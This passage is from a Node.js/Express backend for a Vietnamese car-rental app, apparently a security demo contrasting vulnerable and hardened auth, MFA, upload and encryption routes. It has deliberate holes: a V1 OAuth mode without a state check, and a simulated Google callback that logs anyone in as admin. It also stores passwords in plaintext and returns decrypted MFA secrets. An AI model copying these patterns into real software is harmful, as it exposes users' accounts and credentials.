            return res.status(400).json({ error: "Tài khoản chưa kích hoạt bảo mật đăng nhập 2 lớp (MFA)." });
        }

        // Kiểm tra xem tài khoản có đang bị khóa lockout không
        if (row.LockoutUntil && new Date(row.LockoutUntil) > new Date()) {
            const timeLeft = Math.round((new Date(row.LockoutUntil) - new Date()) / 1000);
            return res.status(423).json({ error: `Tài khoản tạm thời bị khóa do nhập sai nhiều lần. Vui lòng thử lại sau ${timeLeft} giây.` });
        }

        const decryptedSecret = decryptAES(row.MfaSecret);
        const expectedOTP = getTOTP(decryptedSecret);
        if (otp === expectedOTP) {
            // Đúng OTP: Reset attempts
            db.run(`UPDATE Accounts SET LoginAttempts = 0, LockoutUntil = NULL WHERE AccountID = ?`, [row.AccountID]);

            // Thiết lập Cookie access_token chính thức
            const token = jwt.sign({ AccountID: row.AccountID, Username: row.Username, Role: row.Role }, JWT_SECRET, { expiresIn: '1h' });
            res.setHeader('Set-Cookie', `access_token=${token}; HttpOnly; SameSite=Strict; Path=/; Max-Age=3600`);
            res.json({ message: "Đăng nhập thành công! Xác thực 2 lớp hoàn tất." });
        } else {
            // Sai OTP: Tính attempts
            const newAttempts = (row.LoginAttempts || 0) + 1;
            if (newAttempts >= 3) {
                const lockoutTime = new Date(Date.now() + 60 * 1000).toISOString(); // khóa 1 phút
                db.run(`UPDATE Accounts SET LoginAttempts = ?, LockoutUntil = ? WHERE AccountID = ?`, [newAttempts, lockoutTime, row.AccountID]);
                return res.status(423).json({ error: "Mã OTP không chính xác! Tài khoản đã bị tạm khóa trong 1 phút do nhập sai 3 lần." });
            } else {
                db.run(`UPDATE Accounts SET LoginAttempts = ? WHERE AccountID = ?`, [newAttempts, row.AccountID]);
                return res.status(401).json({ error: `Mã OTP không khớp hoặc đã hết hạn! Bạn còn ${3 - newAttempts} lần thử.` });
            }
        }
    });
});

// API V2: Đăng nhập Google giả lập (OAuth 2.0 CSRF Demo)
app.get('/api/v2/auth/google-start', (req, res) => {
    const { mode } = req.query; // 'v1' or 'v2'
    
    if (mode === 'v2') {
        const state = crypto.randomBytes(16).toString('hex');
        res.setHeader('Set-Cookie', `oauth_state=${state}; HttpOnly; SameSite=Strict; Path=/; Max-Age=300`);
        return res.json({
            mode: 'v2',
            state,
            redirectUrl: `/api/v2/auth/google-callback?code=simulated_google_code_for_admin&state=${state}&mode=v2`
        });
    } else {
        res.setHeader('Set-Cookie', `oauth_state=; HttpOnly; SameSite=Strict; Path=/; Max-Age=0`);
        return res.json({
            mode: 'v1',
            state: null,
            redirectUrl: `/api/v2/auth/google-callback?code=simulated_google_code_for_admin&mode=v1`
        });
    }
});

app.get('/api/v2/auth/google-callback', (req, res) => {
    const { code, state, mode } = req.query;
    const cookies = parseCookies(req.headers.cookie);
    const savedState = cookies['oauth_state'];

    // V2 mode: luôn bắt buộc kiểm tra state — bất kể cookie có hay không
    if (mode === 'v2') {
        if (!state || !savedState || state !== savedState) {
            const alertMsg = `🚨 PHÁT HIỆN TẤN CÔNG OAUTH CSRF: Yêu cầu đăng nhập Google bị chặn đứng do tham số state không khớp (Nhận: "${state || 'null'}", Mong đợi: "${savedState || 'null'}").`;
            db.run(`INSERT INTO SecurityAlerts (VehicleID, AccountID, Type, Message, Severity) VALUES (?,?,?,?,?)`,
                [null, 1, 'OAUTH_CSRF_ATTACK', alertMsg, 'HIGH']);
            return res.status(403).json({ error: '[OAUTH-CSRF] Từ chối đăng nhập: Lỗi xác thực tham số state OAuth 2.0 (CSRF Blocked)!' });
        }
    }
    // V1 mode: không kiểm tra state — dễ bị CSRF

    db.get(`SELECT * FROM Accounts WHERE Username = 'admin'`, (err, row) => {
        if (err || !row) return res.status(500).json({ error: 'Không tìm thấy tài khoản admin.' });
        
        const token = jwt.sign({ AccountID: row.AccountID, Username: row.Username, Role: row.Role }, JWT_SECRET, { expiresIn: '1h' });
        
        res.setHeader('Set-Cookie', [
            `access_token=${token}; HttpOnly; SameSite=Strict; Path=/; Max-Age=3600`,
            `oauth_state=; HttpOnly; SameSite=Strict; Path=/; Max-Age=0`
        ]);
        
        res.json({
            message: `[Google OAuth] Đăng nhập Google thành công với tài khoản ${row.Email}!`,
            user: { username: row.Username, email: row.Email, fullName: row.FullName }
        });
    });
});

// API V2: Đổi mật khẩu tài khoản - Xác thực mật khẩu cũ và băm Scrypt mật khẩu mới
app.post('/api/v2/auth/change-password', (req, res, next) => {
    // Gọi middleware verifyTokenV2 thủ công ở đây để giữ cấu trúc route gọn gàng
    verifyTokenV2(req, res, () => {
        const { oldPassword, newPassword } = req.body;
        if (!oldPassword || !newPassword) {
            return res.status(400).json({ error: "Thiếu thông tin mật khẩu cũ hoặc mật khẩu mới." });
        }

        db.get(`SELECT * FROM Accounts WHERE AccountID = ?`, [req.user.AccountID], (err, row) => {
            if (err || !row) return res.status(404).json({ error: "Tài khoản không tồn tại." });

            // 1. Xác thực mật khẩu cũ
            const isMatch = verifyPassword(oldPassword, row.PasswordHash);
            if (!isMatch) {
                return res.status(400).json({ error: "Mật khẩu hiện tại không chính xác!" });
            }

            // 2. Băm mật khẩu mới (Scrypt) và cập nhật CSDL
            const newHash = hashPassword(newPassword);
            db.run(`UPDATE Accounts SET PasswordPlain = ?, PasswordHash = ? WHERE AccountID = ?`, [newPassword, newHash, req.user.AccountID], (err) => {
                if (err) return res.status(500).json({ error: "Lỗi cập nhật mật khẩu mới vào CSDL." });
                res.json({ message: "Đổi mật khẩu thành công! Mật khẩu mới đã được băm và lưu trữ an toàn." });
            });
        });
    });
});

// Middleware V2: Xác thực Token từ Cookie cho người dùng thường
const verifyTokenV2 = (req, res, next) => {
    const cookies = parseCookies(req.headers.cookie);
    const token = cookies['access_token'];

    if (!token) {
        return res.status(401).json({ error: "[V2] Từ chối truy cập: Không tìm thấy Token xác thực (Cookie)!" });
    }

    jwt.verify(token, JWT_SECRET, (err, decoded) => {
        if (err) return res.status(403).json({ error: "[V2] Token hết hạn hoặc không hợp lệ!" });
        req.user = decoded;
        next();
    });
};

// Middleware V2: Xác thực Token từ Cookie và phân quyền Admin
const verifyTokenAndAdminV2 = (req, res, next) => {
    const cookies = parseCookies(req.headers.cookie);
    const token = cookies['access_token'];

    if (!token) {
        return res.status(401).json({ error: "[V2] Từ chối truy cập: Không tìm thấy Token xác thực (Cookie)!" });
    }

    jwt.verify(token, JWT_SECRET, (err, decoded) => {
        if (err) return res.status(403).json({ error: "[V2] Token hết hạn hoặc không hợp lệ!" });
        
        req.user = decoded;
        if (req.user.Role !== 'Admin') {
            return res.status(403).json({ error: "[V2] Bị từ chối: Cần quyền Admin." });
        }
        next();
    });
};

// KB2 (Lớp 2: Bảo mật tầng Ứng dụng & Định danh) - Kích hoạt/Cấu hình MFA TOTP
app.post('/api/v2/auth/mfa-setup', verifyTokenV2, (req, res) => {
    const secret = crypto.randomBytes(10).toString('hex');
    const encryptedSecret = encryptAES(secret);
    db.run(`UPDATE Accounts SET MfaSecret = ?, MfaEnabled = 1 WHERE AccountID = ?`, [encryptedSecret, req.user.AccountID], (err) => {
        if (err) return res.status(500).json({ error: "Lỗi DB khi thiết lập MFA." });
        
        const currentOTP = getTOTP(secret);
        res.json({
            secret,
            currentOTP,
            message: "[V2] Thiết lập xác thực đa yếu tố MFA thành công! Bản ghi DB của bạn đã cập nhật MfaSecret (đã được mã hóa AES-256-GCM)."
        });
    });
});

// KB2 (Lớp 2: Bảo mật tầng Ứng dụng & Định danh) - Xác thực mã OTP
app.post('/api/v2/auth/mfa-verify', verifyTokenV2, (req, res) => {
    const { otp } = req.body;
    db.get(`SELECT MfaSecret, MfaEnabled, LockoutUntil, LoginAttempts FROM Accounts WHERE AccountID = ?`, [req.user.AccountID], (err, row) => {
        if (err || !row || !row.MfaEnabled || !row.MfaSecret) {
            return res.status(400).json({ error: "Tài khoản của bạn chưa kích hoạt MFA." });
        }
        
        // Kiểm tra xem tài khoản có đang bị khóa lockout không
        if (row.LockoutUntil && new Date(row.LockoutUntil) > new Date()) {
            const timeLeft = Math.round((new Date(row.LockoutUntil) - new Date()) / 1000);
            return res.status(423).json({ error: `Tài khoản tạm thời bị khóa do nhập sai nhiều lần. Vui lòng thử lại sau ${timeLeft} giây.` });
        }

        const decryptedSecret = decryptAES(row.MfaSecret);
        const expectedOTP = getTOTP(decryptedSecret);
        if (otp === expectedOTP) {
            // Đúng OTP: Reset attempts
            db.run(`UPDATE Accounts SET LoginAttempts = 0, LockoutUntil = NULL WHERE AccountID = ?`, [req.user.AccountID]);
            res.json({ success: true, message: "[V2] Xác thực mã OTP thành công! Quyền truy cập quản trị được phê chuẩn." });
        } else {
            // Sai OTP: Tính attempts
            const newAttempts = (row.LoginAttempts || 0) + 1;
            if (newAttempts >= 3) {
                const lockoutTime = new Date(Date.now() + 60 * 1000).toISOString(); // khóa 1 phút
                db.run(`UPDATE Accounts SET LoginAttempts = ?, LockoutUntil = ? WHERE AccountID = ?`, [newAttempts, lockoutTime, req.user.AccountID]);
                return res.status(423).json({ error: "[V2] Mã OTP không chính xác! Tài khoản đã bị tạm khóa trong 1 phút do nhập sai 3 lần." });
            } else {
                db.run(`UPDATE Accounts SET LoginAttempts = ? WHERE AccountID = ?`, [newAttempts, req.user.AccountID]);
                return res.status(401).json({ error: `[V2] Mã OTP không khớp hoặc đã hết hạn! Bạn còn ${3 - newAttempts} lần thử.` });
            }
        }
    });
});

// API V2: Lấy trạng thái kích hoạt MFA OTP của tài khoản hiện tại
app.get('/api/v2/auth/mfa-status', verifyTokenV2, (req, res) => {
    db.get(`SELECT MfaEnabled, MfaSecret FROM Accounts WHERE AccountID = ?`, [req.user.AccountID], (err, row) => {
        if (err || !row) return res.status(404).json({ error: "Tài khoản không tồn tại." });
        if (row.MfaEnabled && row.MfaSecret) {
            const decryptedSecret = decryptAES(row.MfaSecret);
            const currentOTP = getTOTP(decryptedSecret);
            return res.json({ mfaEnabled: true, secret: decryptedSecret, currentOTP });
        } else {
            return res.json({ mfaEnabled: false });
        }
    });
});

// API V2: Hủy kích hoạt MFA OTP cho tài khoản hiện tại
app.post('/api/v2/auth/mfa-disable', verifyTokenV2, (req, res) => {
    db.run(`UPDATE Accounts SET MfaSecret = NULL, MfaEnabled = 0 WHERE AccountID = ?`, [req.user.AccountID], (err) => {
        if (err) return res.status(500).json({ error: "Lỗi CSDL khi hủy kích hoạt MFA." });
        res.json({ message: "Đã hủy kích hoạt xác thực 2 lớp (OTP) thành công." });
    });
});

app.delete('/api/v2/admin/vehicles/delete', verifyTokenAndAdminV2, (req, res) => {
    const vehicleId = req.body.VehicleID;
    db.run(`DELETE FROM Vehicles WHERE VehicleID =?`, [vehicleId], (err) => {
        res.send(`[V2] Đã xóa an toàn.`);
    });
});

// KB3 (Bảo mật Upload): Lọc đuôi tệp, đổi tên ngẫu nhiên và chống Path Traversal
const storageV2 = multer.diskStorage({
  destination: (req, file, cb) => { cb(null, 'uploads/') },
  filename: (req, file, cb) => { 
      // Lấy tên file gốc an toàn, loại bỏ các ký tự điều hướng thư mục
      const safeName = path.basename(file.originalname);
      const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1E9);
      
      // Đảm bảo đường dẫn tuyệt đối của tệp đích thực sự nằm bên trong thư mục uploads
      const targetDir = path.resolve('uploads');
      const targetPath = path.resolve(targetDir, "V2_" + uniqueSuffix + path.extname(safeName));
      
      if (!targetPath.startsWith(targetDir)) {
          return cb(new Error("[V2] Phát hiện tấn công Path Traversal!"));
      }
      
      cb(null, path.basename(targetPath));
  }
});
const uploadSecure = multer({ 
    storage: storageV2,
    limits: { fileSize: 2 * 1024 * 1024 },
    fileFilter: (req, file, cb) => {
        const allowedTypes = /jpeg|jpg|png/;
        const extname = allowedTypes.test(path.extname(file.originalname).toLowerCase());
        const mimetype = allowedTypes.test(file.mimetype);
        if (extname && mimetype) return cb(null, true);
        cb(new Error("[V2] Lỗi: Chỉ cho phép tệp JPG/PNG."));
    }
});
app.post('/api/v2/upload-license', (req, res, next) => {
    // First check auth
    verifyTokenV2(req, res, () => {
        uploadSecure.single('license_image')(req, res, (uploadErr) => {
            if (uploadErr) return res.status(400).json({ error: uploadErr.message });
            if (!req.file) return res.status(400).json({ error: '[V2] Không có tệp được tải lên.' });
            const filePath = req.file.path;
            const licenseNumber = req.body.licenseNumber || '';
            try {
                const buffer = Buffer.alloc(4);
                const fd = fs.openSync(filePath, 'r');
                fs.readSync(fd, buffer, 0, 4, 0);
                fs.closeSync(fd);
                const hex = buffer.toString('hex').toUpperCase();
                const isJpeg = hex.startsWith('FFD8FF');
                const isPng = hex.startsWith('89504E47');
                if (!isJpeg && !isPng) {
                    fs.unlinkSync(filePath);
                    return res.status(400).json({ error: '[V2] Tệp tải lên giả mạo định dạng! Chỉ chấp nhận JPEG/PNG thực.' });
                }
                const imageURL = '/uploads/' + req.file.filename;
                // Upsert UserDocuments: update if exists, insert if not
                db.get(`SELECT DocID FROM UserDocuments WHERE AccountID = ?`, [req.user.AccountID], (err, existing) => {
                    if (existing) {
                        db.run(`UPDATE UserDocuments SET ImageURL = ?, LicenseNumber = ?, VerifiedStatus = 'verified' WHERE AccountID = ?`,
                            [imageURL, licenseNumber, req.user.AccountID]);
                    } else {
                        db.run(`INSERT INTO UserDocuments (AccountID, LicenseData, IsEncrypted, LicenseNumber, ImageURL, VerifiedStatus) VALUES (?,?,0,?,?,'verified')`,
                            [req.user.AccountID, '', licenseNumber, imageURL]);
                    }
                    res.json({ message: '[V2] Tải ảnh bằng lái thành công! Magic Bytes hợp lệ. Bằng lái đã được xác nhận.', imageURL });
                });
            } catch (err) {
                if (fs.existsSync(filePath)) fs.unlinkSync(filePath);
                res.status(500).json({ error: '[V2] Lỗi kiểm duyệt tệp: ' + err.message });
            }
        });
    });
});

app.post('/api/v2/user/document', verifyTokenV2, (req, res) => {
    const licenseData = req.body.LicenseNumber;
    
    // Mã hóa dữ liệu bằng Public Key với chuẩn padding RSA_PKCS1_OAEP_PADDING an toàn
    const encryptedBuffer = crypto.publicEncrypt({
        key: publicKey,
        padding: crypto.constants.RSA_PKCS1_OAEP_PADDING,
        oaepHash: "sha256",
    }, Buffer.from(licenseData));
    
    // Chuyển sang chuỗi Base64 để lưu vào CSDL
    const ciphertext = encryptedBuffer.toString('base64');

    db.run(`INSERT INTO UserDocuments (AccountID, LicenseData, IsEncrypted) VALUES (?,?,?)`, [req.user.AccountID, ciphertext, true], (err) => {
        res.send("[V2] Đã mã hóa RSA và lưu dữ liệu PII thành công.");
    });
});

// (Tùy chọn) API giải mã chỉ dành cho Admin nội bộ hệ thống để xem dữ liệu thật
app.post('/api/v2/admin/decrypt-document', verifyTokenAndAdminV2, (req, res) => {
    const encryptedData = req.body.Ciphertext;
    try {
        const decryptedBuffer = crypto.privateDecrypt({
            key: privateKey,
            padding: crypto.constants.RSA_PKCS1_OAEP_PADDING,
            oaepHash: "sha256",
        }, Buffer.from(encryptedData, 'base64'));
        
        res.json({ DecryptedData: decryptedBuffer.toString() });
    } catch (e) {
        res.status(500).json({ error: "Giải mã thất bại hoặc dữ liệu bị giả mạo!" });
    }
});

// API lấy thông tin giải trí trên xe (Chỉ xe mình đang thuê và đã giải mã AES) - BOLA & AES Decryption Check
app.get('/api/v2/vehicles/infotainment', verifyTokenV2, (req, res) => {
    db.get(`SELECT VehicleID FROM Rentals WHERE AccountID = ? AND Status = 'Active' LIMIT 1`, [req.user.AccountID], (err, rental) => {
        if (err || !rental) {
            return res.status(404).json({ error: "[V2] Bạn hiện không có hợp đồng thuê xe nào đang hoạt động!" });
        }
        
        const vehicleId = rental.VehicleID;
        db.get(`SELECT * FROM VehicleInfotainment WHERE VehicleID = ?`, [vehicleId], (err, row) => {
            if (err) return res.status(500).json({ error: "Lỗi DB." });
            if (!row) {
                return res.json({ 
                    VehicleID: vehicleId, 
                    SyncedContacts: "Không có dữ liệu (Đã bị VIPR xóa sạch khỏi xe)", 
                    GPSHistory: "Không có dữ liệu (Đã bị VIPR xóa sạch khỏi xe)", 
                    ActiveBluetoothDevice: "Không có kết nối" 
                });
            }
            
            res.json({
                VehicleID: row.VehicleID,
                SyncedContacts: decryptAES(row.SyncedContacts),
                GPSHistory: decryptAES(row.GPSHistory),
                ActiveBluetoothDevice: row.ActiveBluetoothDevice
            });
        });
    });
});

// Hàm tiện ích lọc ký tự đặc biệt (HTML Entity Encoding) để phòng chống XSS
function escapeHtml(unsafe) {
    if (typeof unsafe !== 'string') return unsafe;
    return unsafe
         .replace(/&/g, "&amp;")
         .replace(/</g, "&lt;")
         .replace(/>/g, "&gt;")
         .replace(/"/g, "&quot;")
         .replace(/'/g, "&#039;");
}

// KB5 (Bảo mật XSS): Nhận thông tin xe và lưu trữ an toàn
app.post('/api/v2/vehicles/add', (req, res) => {
    const { vehicleName, vehicalorcview } = req.body;
    if (!vehicleName || !vehicalorcview) {
        return res.status(400).send("Thiếu thông tin xe.");
    }
    db.run(`INSERT INTO Vehicles (Model, Status) VALUES (?, ?)`, [vehicleName, vehicalorcview], function(err) {
        if (err) return res.status(500).send("Lỗi DB");
        res.status(200).send("[V2] Thêm xe thành công!");
    });
});

// KB5 (Bảo mật XSS): Trả về HTML đã qua làm sạch dữ liệu đầu ra (Output Escaping)
app.get('/api/v2/admin/view-vehicle', (req, res) => {
    db.get(`SELECT * FROM Vehicles ORDER BY VehicleID DESC LIMIT 1`, (err, row) => {
        if (!row) return res.send("Chưa có xe nào.");
        
        // Thực hiện escape dữ liệu trước khi render HTML
        const safeModel = escapeHtml(row.Model);
        const safeStatus = escapeHtml(row.Status);
        
        const html = `
            <!DOCTYPE html>
            <html>
            <head><title>Quản trị Xe [V2]</title><meta charset="utf-8"></head>
            <body>
                <h2>Chi tiết xe: ${safeModel}</h2>
                <p><strong>Đánh giá/Ghi chú (Được bảo vệ):</strong> ${safeStatus}</p> 
            </body>
            </html>
        `;
        res.send(html);
    });
});

// =========================================================
// NEW API: Real car rental features
// =========================================================

// GET all categories
app.get('/api/v2/categories', (req, res) => {
    db.all(`SELECT * FROM VehicleCategories`, (err, rows) => {
        if (err) return res.status(500).json({ error: err.message });
        res.json(rows || []);
    });
});

// GET vehicles with smart filtering (date availability + type/price/transmission/fuel)
app.get('/api/v2/vehicles/search', (req, res) => {
    const { startDate, endDate, transmission, fuel, maxPrice, categoryId } = req.query;
    let query = `SELECT v.*,
        c.Name as CategoryName,
        COALESCE((SELECT ROUND(AVG(r.Rating),1) FROM Reviews r WHERE r.VehicleID = v.VehicleID), 0) as AvgRating,
        COALESCE((SELECT COUNT(r.ReviewID) FROM Reviews r WHERE r.VehicleID = v.VehicleID), 0) as ReviewCount
        FROM Vehicles v
        LEFT JOIN VehicleCategories c ON v.CategoryID = c.CategoryID
        WHERE 1=1`;
    const params = [];
    if (transmission && transmission !== 'all') { query += ` AND v.Transmission = ?`; params.push(transmission); }
    if (fuel && fuel !== 'all')         { query += ` AND v.FuelType = ?`; params.push(fuel); }
    if (maxPrice)                       { query += ` AND v.PricePerDay <= ?`; params.push(parseInt(maxPrice)); }
    if (categoryId && categoryId !== '0') { query += ` AND v.CategoryID = ?`; params.push(parseInt(categoryId)); }
    if (startDate && endDate) {
        query += ` AND v.VehicleID NOT IN (
            SELECT VehicleID FROM Rentals
            WHERE Status = 'Active' AND StartDate IS NOT NULL AND EndDate IS NOT NULL
            AND StartDate <= ? AND EndDate >= ?
        )`;
        params.push(endDate, startDate);
    }
    db.all(query, params, (err, rows) => {
        if (err) return res.status(500).json({ error: err.message });
        res.json(rows || []);
    });
});

// GET vehicle detail with reviews
app.get('/api/v2/vehicles/:id', (req, res, next) => {
    const vid = parseInt(req.params.id);
    if (isNaN(vid)) return next();
    db.get(`SELECT v.*, c.Name as CategoryName FROM Vehicles v
        LEFT JOIN VehicleCategories c ON v.CategoryID = c.CategoryID
        WHERE v.VehicleID = ?`, [vid], (err, vehicle) => {
        if (err || !vehicle) return res.status(404).json({ error: 'Xe khong ton tai.' });
        db.all(`SELECT r.*, a.FullName, a.Username FROM Reviews r
            LEFT JOIN Accounts a ON r.AccountID = a.AccountID
            WHERE r.VehicleID = ? ORDER BY r.Timestamp DESC LIMIT 10`, [vid], (err2, reviews) => {
            res.json({ ...vehicle, reviews: reviews || [] });
        });
    });
});

// POST submit review (must have rented this vehicle)
app.post('/api/v2/reviews', verifyTokenV2, (req, res) => {
    const { vehicleId, rating, comment } = req.body;
    if (!vehicleId || !rating || rating < 1 || rating > 5)
        return res.status(400).json({ error: 'Thieu thong tin hoac rating khong hop le (1-5).' });
        db.get(`SELECT r.RentalID FROM Rentals r
        WHERE r.AccountID = ? AND r.VehicleID = ? AND r.Status = 'Completed'
        ORDER BY r.RentalID DESC LIMIT 1`,
        [req.user.AccountID, vehicleId], (err, rental) => {
        if (!rental) return res.status(403).json({ error: 'Chi co the danh gia xe sau khi hoan tat chuyen thue.' });
        db.get(`SELECT ReviewID FROM Reviews WHERE RentalID = ?`, [rental.RentalID], (reviewErr, existingReview) => {
            if (existingReview) return res.status(409).json({ error: 'Ban da danh gia chuyen thue nay roi.' });
            db.run(`INSERT INTO Reviews (AccountID, VehicleID, RentalID, Rating, Comment) VALUES (?,?,?,?,?)`,
                [req.user.AccountID, vehicleId, rental.RentalID, rating, comment || ''], (err2) => {
                if (err2) return res.status(500).json({ error: err2.message });
                res.json({ message: 'Da gui danh gia thành công! Cam on ban.' });
            });
        });
    });
});

// GET my rental history
app.get('/api/v2/rentals/my', verifyTokenV2, (req, res) => {
    db.all(`SELECT r.*, v.Model, v.LicensePlate, v.ImageURL, v.PricePerDay, v.Seats, v.Transmission
        FROM Rentals r LEFT JOIN Vehicles v ON r.VehicleID = v.VehicleID
        WHERE r.AccountID = ? ORDER BY r.RentalID DESC`, [req.user.AccountID], (err, rows) => {
        if (err) return res.status(500).json({ error: err.message });
        res.json(rows || []);
    });
});

// GET current user profile
app.get('/api/v2/profile', verifyTokenV2, (req, res) => {
    db.get(`SELECT AccountID, Username, Role, FullName, Phone, Email, MfaEnabled
        FROM Accounts WHERE AccountID = ?`, [req.user.AccountID], (err, row) => {
        if (err || !row) return res.status(404).json({ error: 'Khong tim thay tai khoan.' });
        db.get(`SELECT DocID, LicenseNumber, ImageURL, VerifiedStatus FROM UserDocuments WHERE AccountID = ? ORDER BY DocID DESC LIMIT 1`, [req.user.AccountID], (err2, doc) => {
            res.json({ ...row, license: doc || null });
        });
    });
});

// GET current user's documents
app.get('/api/v2/user/documents', verifyTokenV2, (req, res) => {
    db.all(`SELECT DocID, AccountID, LicenseData, IsEncrypted, LicenseNumber, ImageURL, VerifiedStatus, Timestamp
        FROM UserDocuments
        WHERE AccountID = ?
        ORDER BY DocID DESC`, [req.user.AccountID], (err, rows) => {
        if (err) return res.status(500).json({ error: err.message });
        res.json(rows || []);
    });
});

// PUT update user profile
app.put('/api/v2/profile', verifyTokenV2, (req, res) => {
    const { fullName, phone, email } = req.body;
    db.run(`UPDATE Accounts SET FullName=?, Phone=?, Email=? WHERE AccountID=?`,
        [fullName || '', phone || '', email || '', req.user.AccountID], (err) => {
        if (err) return res.status(500).json({ error: err.message });
        res.json({ message: 'Cap nhat ho so thành công!' });
    });
});

const pendingRoutes = {}; // Lưu routeType mà khách hàng chọn khi đặt xe

// POST rent with date range (enhanced version)
app.post('/api/v2/rentals/rent-dated', verifyTokenV2, (req, res) => {
    const { vehicleId, startDate, endDate, pickupLocation, returnLocation, routeType } = req.body;
    const gatekeeperHeader = req.headers['x-rentalshield-gatekeeper'];
    if (gatekeeperHeader !== 'client-v2-active')
        return res.status(403).json({ error: '[V2] Tu choi: Header khong hop le!' });
    if (!vehicleId || !startDate || !endDate)
        return res.status(400).json({ error: 'Thieu vehicleId, startDate hoac endDate.' });
    const start = new Date(startDate);
    const end   = new Date(endDate);
    if (isNaN(start) || isNaN(end) || end <= start)
        return res.status(400).json({ error: 'Ngay tra xe phai sau ngay nhan xe.' });
    const days = Math.max(1, Math.ceil((end - start) / (1000 * 60 * 60 * 24)));
    // Kiểm tra bằng lái xe trước khi đặt xe
    db.get(`SELECT DocID FROM UserDocuments WHERE AccountID = ? AND VerifiedStatus = 'verified'`, [req.user.AccountID], (licErr, licRow) => {
        if (!licRow) return res.status(403).json({ error: 'Bạn chưa có bằng lái xe hợp lệ. Vui lòng tải ảnh bằng lái trong mục Hồ sơ trước khi đặt xe.' });
    db.get(`SELECT * FROM Vehicles WHERE VehicleID = ?`, [vehicleId], (err, vehicle) => {
        if (err || !vehicle) return res.status(404).json({ error: 'Xe khong ton tai.' });
        if (vehicle.Status !== 'Available') return res.status(400).json({ error: 'Xe hien khong trong.' });
        db.get(`SELECT RentalID FROM Rentals WHERE VehicleID = ? AND Status = 'Active' AND StartDate <= ? AND EndDate >= ?`,
            [vehicleId, endDate, startDate], (err2, conflict) => {
            if (conflict) return res.status(400).json({ error: 'Xe da duoc dat trong khoang thoi gian nay.' });
            const totalAmount = days * (vehicle.PricePerDay || 500000);
            const loc = pickupLocation || 'Ha Noi';
            const rType = routeType || 'hanoi';
            db.run(`INSERT INTO Rentals (VehicleID, AccountID, Status, StartDate, EndDate, PickupLocation, ReturnLocation, TotalAmount, RouteType)
                VALUES (?,?,'Active',?,?,?,?,?,?)`,
                [vehicleId, req.user.AccountID, startDate, endDate, loc, returnLocation || loc, totalAmount, rType],
                function(err3) {
                if (err3) return res.status(500).json({ error: 'Loi tao hop dong.' });
                const rentalId = this.lastID;
                
                // Optimistic Concurrency Control check
                db.run(`UPDATE Vehicles SET Status = 'Rented', Version = Version + 1 WHERE VehicleID = ? AND Version = ?`,
                    [vehicleId, vehicle.Version],
                    function(err4) {
                        if (err4 || this.changes === 0) {
                            // OCC check failed: race condition!
                            db.run(`DELETE FROM Rentals WHERE RentalID = ?`, [rentalId]);
                            return res.status(409).json({ error: '[CONCURRENCY] Lỗi tranh chấp đồng thời: Trạng thái xe đã thay đổi bởi người dùng khác cùng lúc! Vui lòng thử lại.' });
                        }
                        
                        const username = req.user.Username || 'user';
                        const cPlain = `Danh ba ${username}: Me (090${Math.floor(1e6+Math.random()*9e6)}), Ban be (098${Math.floor(1e6+Math.random()*9e6)})`;
                        const gPlain = `GPS Log: Nha (103.${Math.floor(10+Math.random()*90)}, 21.${Math.floor(10+Math.random()*90)})`;
                        
                        db.get(`SELECT DeviceModel FROM Accounts WHERE AccountID = ?`, [req.user.AccountID], (err, userRow) => {
                            const deviceModel = userRow?.DeviceModel || 'Thiết bị không xác định';
                            db.run(`INSERT OR REPLACE INTO VehicleInfotainment (VehicleID, SyncedContacts, GPSHistory, ActiveBluetoothDevice) VALUES (?,?,?,?)`,
                                [vehicleId, encryptAES(cPlain), encryptAES(gPlain), deviceModel + ' (Đang kết nối)'], (err5) => {
                                
                                initGpsSession(vehicleId, req.user.AccountID, routeType || 'hanoi');
                                
                                res.json({
                                    message: `Đã đặt xe thành công! Hợp đồng đã tự động kích hoạt.`,
                                    rentalId, vehicleId, totalAmount,
                                    days, pricePerDay: vehicle.PricePerDay
                                });
                            });
                        });
                    }
                );
            });
        });
    });
    }); // close license check
});

// =========================================================
// MISSING ROUTES — gọi từ client.html
// =========================================================

// GET all vehicles (public) — hiển thị danh sách xe trên trang chủ
app.get('/api/v2/vehicles', (req, res) => {
    db.all(`SELECT v.*,
        c.Name as CategoryName,
        ROUND(COALESCE(AVG(r.Rating), 0), 1) as AvgRating,
        COUNT(r.ReviewID) as ReviewCount
        FROM Vehicles v
        LEFT JOIN VehicleCategories c ON v.CategoryID = c.CategoryID
        LEFT JOIN Reviews r ON r.VehicleID = v.VehicleID
        GROUP BY v.VehicleID
        ORDER BY v.VehicleID ASC`, (err, rows) => {
        if (err) return res.status(500).json({ error: err.message });
        res.json(rows || []);
    });
});

// GET my current active rental — kiểm tra trạng thái thuê xe hiện tại
app.get('/api/v2/vehicles/my-rental', verifyTokenV2, (req, res) => {
    db.get(`SELECT r.*, v.Model, v.LicensePlate, v.ImageURL, v.PricePerDay
        FROM Rentals r
        LEFT JOIN Vehicles v ON r.VehicleID = v.VehicleID
        WHERE r.AccountID = ? AND r.Status = 'Active'
        ORDER BY r.RentalID DESC LIMIT 1`, [req.user.AccountID], (err, row) => {
        if (err) return res.status(500).json({ error: err.message });
        if (!row) return res.json({});
        res.json(row);
    });
});

// GET my owned vehicles
app.get('/api/v2/vehicles/my-owned', verifyTokenV2, (req, res) => {
    db.all(`SELECT * FROM Vehicles WHERE OwnerID = ?`, [req.user.AccountID], (err, rows) => {
        if (err) return res.status(500).json({ error: err.message });
        res.json(rows || []);
    });
});

// POST rent vehicle (alias path gọi từ client) — không yêu cầu gatekeeper header
app.post('/api/v2/vehicles/rent-dated', verifyTokenV2, (req, res) => {
    const { vehicleId, startDate, endDate, simulationType } = req.body;
    const routeType = simulationType || 'hanoi';
    if (!vehicleId || !startDate || !endDate)
        return res.status(400).json({ error: 'Thiếu vehicleId, startDate hoặc endDate.' });
    const start = new Date(startDate);
    const end   = new Date(endDate);
    if (isNaN(start) || isNaN(end) || end <= start)
        return res.status(400).json({ error: 'Ngày trả xe phải sau ngày nhận xe.' });
    const days = Math.max(1, Math.ceil((end - start) / (1000 * 60 * 60 * 24)));
    // Kiểm tra bằng lái xe
    db.get(`SELECT DocID FROM UserDocuments WHERE AccountID = ? AND VerifiedStatus = 'verified'`, [req.user.AccountID], (licErr, licRow) => {
        if (!licRow) return res.status(403).json({ error: 'Bạn cần tải lên bằng lái xe hợp lệ trước khi thuê xe!' });
        // Kiểm tra xe tồn tại và trạng thái
        db.get(`SELECT * FROM Vehicles WHERE VehicleID = ?`, [vehicleId], (err, vehicle) => {
            if (err || !vehicle) return res.status(404).json({ error: 'Xe không tồn tại.' });
